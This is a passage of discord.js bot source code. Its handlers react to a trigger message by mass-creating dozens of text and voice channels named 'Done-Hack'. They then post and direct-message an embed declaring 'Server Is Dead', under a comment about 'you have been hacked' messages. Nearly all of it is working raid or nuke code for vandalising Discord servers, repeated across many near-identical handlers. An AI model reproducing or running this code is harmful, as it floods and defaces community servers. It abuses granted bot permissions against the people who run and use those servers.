  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});

//هنا الرسايل تم تهكيرك وكذا

client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
